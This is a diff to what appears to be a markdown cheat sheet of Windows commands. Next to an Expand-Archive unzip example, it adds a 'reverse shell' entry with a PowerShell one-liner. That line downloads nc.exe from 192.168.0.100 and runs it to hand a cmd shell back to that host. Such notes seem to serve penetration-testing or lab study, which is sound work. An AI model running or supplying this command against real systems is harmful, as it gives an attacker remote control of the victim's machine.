@@ -283,6 +283,12 @@ unzip
 Expand-Archive -LiteralPath C:\Users\guest\Desktop\dist.zip -DestinationPath C:\Users\guest\Desktop
 ```
 
+reverse shell
+
+```powershell
+powershell -c "IEX(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.100/nc.exe', 'C:\users\XXX\desktop\nc.exe');C:\users\XXX\desktop\nc.exe 192.168.0.100 80 -e cmd"
+```
+
 ### :open_file_folder: others
 
 xxx is not recognized as an internal or external command, operable program or batch file.
